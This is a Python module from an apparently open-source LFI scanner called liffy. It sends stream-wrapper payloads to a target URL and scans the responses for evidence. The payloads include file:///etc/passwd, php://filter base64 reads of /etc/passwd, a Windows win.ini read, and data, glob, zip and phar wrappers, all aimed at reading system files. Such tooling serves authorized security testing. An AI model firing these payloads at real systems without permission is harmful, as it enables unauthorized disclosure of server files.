import base64
import re

from .Detection import Detection
from .utils import attack, cook, parse_headers, parse_post_data
from .rich_output import colors, print_info, print_success


class WrapperScan:
    """Detection-focused checks for common LFI stream wrappers."""

    DEFAULT_PROBES = [
        {
            "name": "file-linux",
            "payload": "file:///etc/passwd",
            "indicators": ["root:", "/bin/sh", "daemon:"],
        },
        {
            "name": "file-windows",
            "payload": "file:///c:/windows/win.ini",
            "indicators": ["[fonts]", "[extensions]", "for 16-bit app support"],
        },
        {
            "name": "php-filter-base64",
            "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "indicators": ["root:", "/bin/sh", "daemon:"],
            "decode_base64": True,
        },
        {
            "name": "php-filter-iconv",
            "payload": "php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd",
            "indicators": ["root", "daemon", "bin"],
        },
        {
            "name": "data",
            "payload": "data://text/plain,liffy_wrapper_probe",
            "indicators": ["liffy_wrapper_probe"],
        },
        {
            "name": "php-temp",
            "payload": "php://temp",
            "indicators": [],
            "informational": True,
        },
        {
            "name": "php-memory",
            "payload": "php://memory",
            "indicators": [],
            "informational": True,
        },
        {
            "name": "glob",
            "payload": "glob:///etc/pass*",
            "indicators": ["/etc/passwd", "passwd"],
            "informational": True,
        },
        {
            "name": "zip",
            "payload": "zip:///tmp/liffy_probe.zip#probe.txt",
            "indicators": ["liffy_wrapper_probe"],
            "requires_existing_file": True,
        },
        {
            "name": "phar",
            "payload": "phar:///tmp/liffy_probe.phar/probe.txt",
            "indicators": ["liffy_wrapper_probe"],
            "requires_existing_file": True,
        },
    ]

    def __init__(self, args):
        self.target = args.url
        self.cookies = args.cookies
        self.detection = True
        self.method = getattr(args, "method", "GET")
        self.custom_headers = parse_headers(getattr(args, "headers", None))
        self.post_data = parse_post_data(getattr(args, "post_data", None))
        self.wrapper_list = getattr(args, "wrapper_list", None)

    def attack(self, payload):
        cookies = cook(self.cookies) if self.cookies else None
        return attack(
            self.target,
            payload,
            cookies=cookies,
            detection_mode=True,
            method=self.method,
            post_data=self.post_data,
            custom_headers=self.custom_headers,
        )

    def _response_text(self, response, probe):
        text = response.text or ""
        if not probe.get("decode_base64"):
            return text

        compact = re.sub(r"[^A-Za-z0-9+/=]", "", text)
        try:
            decoded = base64.b64decode(compact, validate=False).decode(
                "utf-8", errors="ignore"
            )
        except Exception:
            return text

        return f"{text}\n{decoded}"

    def _load_probes(self):
        if not self.wrapper_list:
            return self.DEFAULT_PROBES

        probes = []
        with open(self.wrapper_list, "r") as payload_file:
            for line_number, line in enumerate(payload_file, 1):
                payload = line.strip()
                if not payload or payload.startswith("#"):
                    continue

                name = f"custom-{line_number}"
                if "=" in payload and not payload.startswith(("file://", "php://", "data://")):
                    name, payload = payload.split("=", 1)
                    name = name.strip() or f"custom-{line_number}"
                    payload = payload.strip()

                probes.append(
                    {
                        "name": name,
                        "payload": payload,
                        "indicators": [],
                        "custom": True,
                    }
                )

        return probes or self.DEFAULT_PROBES

    def execute_wrapper_scan(self):
        print(colors("[~] Testing common LFI wrappers", 93))

        findings = []
        detector = Detection(self)

        for probe in self._load_probes():
            notes = []
            if probe.get("requires_existing_file"):
                notes.append("requires existing target file")
            if probe.get("informational"):
                notes.append("informational")

            suffix = f" ({', '.join(notes)})" if notes else ""
            print_info(f"Testing {probe['name']} wrapper{suffix}")

            response = self.attack(probe["payload"])
            if not response:
                continue

            text = self._response_text(response, probe)
            matched = next(
                (indicator for indicator in probe["indicators"] if indicator in text),
                None,
            )
            analyzed = detector.analyze_response(response, probe["payload"]) or {}

            # Wrapper-specific evidence is required for strong wrapper findings.
            # Generic detection is only accepted for non-informational probes that
            # do not depend on a pre-existing archive on the target filesystem.
            allow_generic = not probe.get("informational") and not probe.get(
                "requires_existing_file"
            )
            is_vulnerable = bool(matched) or (
                allow_generic and analyzed.get("is_vulnerable", False)
            )

            if is_vulnerable:
                finding = {
                    "wrapper": probe["name"],
                    "payload": probe["payload"],
                    "evidence": matched
                    or analyzed.get("evidence", "generic detection match"),
                    "status_code": response.status_code,
                    "notes": notes,
                }
                findings.append(finding)
                print_success(
                    f"{probe['name']} wrapper appears usable with payload: {probe['payload']}"
                )

        if findings:
            print(colors("\n[+] WRAPPER SUMMARY", 92))
            print(colors("=" * 50, 92))
            for finding in findings:
                print(colors(f"[{finding['wrapper']}] {finding['payload']}", 94))
                print(colors(f"    Evidence: {finding['evidence']}", 94))
                if finding["notes"]:
                    print(colors(f"    Notes: {', '.join(finding['notes'])}", 94))
        else:
            print(colors("[-] No usable wrappers detected.", 91))
